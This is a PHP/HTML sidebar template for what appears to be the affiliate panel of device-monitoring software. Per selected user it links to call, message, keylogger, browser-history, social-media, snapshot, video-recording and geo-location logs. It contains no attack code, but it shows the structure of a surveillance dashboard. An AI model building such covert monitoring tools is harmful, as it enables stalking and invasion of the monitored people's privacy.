<div class="page-sidebar-wrapper">
    <div class="page-sidebar navbar-collapse collapse">

        <ul class="page-sidebar-menu  page-header-fixed " data-keep-expanded="false" data-auto-scroll="true" data-slide-speed="200" style="padding-top: 20px">
            <li class="sidebar-toggler-wrapper hide">
                <div class="sidebar-toggler"> </div>
            </li>
            <li class="nav-item start <?= $dashboard; ?>">
                <a href="<?= affiliate_url(); ?>dashboard" class="nav-link nav-toggle">
                    <i class="fa fa-dashboard" aria-hidden="true"></i>
                    <span class="title">Dashboard</span>
                    <span class="selected"></span>
                </a>
            </li>
            <li class="nav-item start <?= $userinfo; ?>">
                <a href="<?= affiliate_url(); ?>user" class="nav-link nav-toggle">
                    <i class="fa fa-user" aria-hidden="true"></i>
                    <span class="title">User</span>
                    <span class="selected"></span>
                </a>
            </li>
            <?php if (isset($user_id) && ($user_id != '')) { ?>
                <li class="nav-item start <?= $overview; ?>">
                    <a href="<?= affiliate_url(); ?>user/overview/<?= $user_id; ?>" class="nav-link nav-toggle">
                        <i class="fa fa-dashboard" aria-hidden="true"></i>
                        <span class="title">Overview</span>
                        <span class="selected"></span>
                    </a>
                </li>
                <li class="nav-item start <?= $application; ?>">
                    <a href="<?= affiliate_url(); ?>user/application/<?= $user_id; ?>" class="nav-link nav-toggle">
                        <i class="fa fa-gear" aria-hidden="true"></i>
                        <span class="title">Application</span>
                        <span class="selected"></span>
                    </a>
                </li>
                <li class="nav-item start <?= $logs; ?>">
                    <a href="<?= affiliate_url(); ?>user/contact/<?= $user_id; ?>" class="nav-link">
                        <i class="fa fa-eye" aria-hidden="true"></i>
                        <span class="title">Logs</span>
                        <span class="selected"></span>
                        <span class="arrow open"></span>
                    </a>
                    <ul class="sub-menu">
                        <li class="nav-item start <?= $contact; ?>">
                            <a href="<?= affiliate_url(); ?>user/contact/<?= $user_id; ?>" class="nav-link ">
                                <i class="fa fa-user" aria-hidden="true"></i>
                                <span class="title">Contact</span>
                                <span class="selected"></span>
                            </a>
                        </li>
                        <li class="nav-item start <?= $call; ?>">
                            <a href="<?= affiliate_url(); ?>user/call/<?= $user_id; ?>" class="nav-link ">
                                <i class="fa fa-phone" aria-hidden="true"></i>
                                <span class="title">Call</span>
                            </a>
                        </li>
                        <li class="nav-item start <?= $message; ?>">
                            <a href="<?= affiliate_url(); ?>user/message/<?= $user_id; ?>" class="nav-link ">
                                <i class="fa fa-commenting" aria-hidden="true"></i>
                                <span class="title">Message</span>
                            </a>
                        </li>
                        <li class="nav-item start <?= $key_logger; ?>">
                            <a href="<?= affiliate_url(); ?>user/key_logger/<?= $user_id; ?>" class="nav-link ">
                                <i class="fa fa-key" aria-hidden="true"></i>
                                <span class="title">Key Logger</span>
                            </a>
                        </li>
                        <li class="nav-item start <?= $browser_histroy; ?>">
                            <a href="<?= affiliate_url(); ?>user/browser_history/<?= $user_id; ?>" class="nav-link ">
                                <i class="fa fa-history" aria-hidden="true"></i>
                                <span class="title">Browser History</span>
                            </a>
                        </li>
                        <li class="nav-item start <?= $socail_media; ?>">
                            <a href="<?= affiliate_url(); ?>user/social_media/<?= $user_id; ?>" class="nav-link ">
                                <i class="fa fa-share-square-o" aria-hidden="true"></i>
                                <span class="title">Social Media</span>
                            </a>
                        </li>
<!--                        <li class="nav-item start <?= $notification; ?>">
                            <a href="<?= affiliate_url(); ?>user/notification/<?= $user_id; ?>" class="nav-link ">
                                <i class="fa fa-bell" aria-hidden="true"></i>
                                <span class="title">Notification</span>
                            </a>
                        </li>-->
                    </ul>
                </li>
                <li class="nav-item start <?= $gallary; ?>">
                    <a href="<?= affiliate_url(); ?>user/gallery/<?= $user_id; ?>" class="nav-link nav-toggle">
                        <i class="fa fa-picture-o" aria-hidden="true"></i>
                        <span class="title">Gallery</span>
                        <span class="selected"></span>
                    </a>
                </li>
                <li class="nav-item start <?= $screen_photo; ?>">
                    <a href="<?= affiliate_url(); ?>user/snapshots/<?= $user_id; ?>" class="nav-link nav-toggle">
                       <i class="fa fa-file-image-o" aria-hidden="true"></i>
                        <span class="title">Snapshots</span>
                        <span class="selected"></span>
                    </a>
                </li>
                <li class="nav-item start <?= $video; ?>">
                    <a href="<?= affiliate_url(); ?>user/video/<?= $user_id; ?>" class="nav-link nav-toggle">
                        <i class="fa fa-file-video-o" aria-hidden="true"></i>
                        <span class="title">Video</span>
                        <span class="selected"></span>
                    </a>
                </li>
                <li class="nav-item start <?= $screen_video; ?>">
                    <a href="<?= affiliate_url(); ?>user/video_recording/<?= $user_id; ?>" class="nav-link nav-toggle">
                        <i class="fa fa-file-video-o" aria-hidden="true"></i>
                        <span class="title">Video Recording</span>
                        <span class="selected"></span>
                    </a>
                </li>
                <li class="nav-item start <?= $geo_location; ?>">
                    <a href="<?= affiliate_url(); ?>user/geo_location/<?= $user_id; ?>" class="nav-link nav-toggle">
                        <i class="fa fa-compass" aria-hidden="true"></i>
                        <span class="title">Geo Location</span>
                        <span class="selected"></span>
                    </a>
                </li>
            <?php } ?>
        </ul>
    </div>
</div>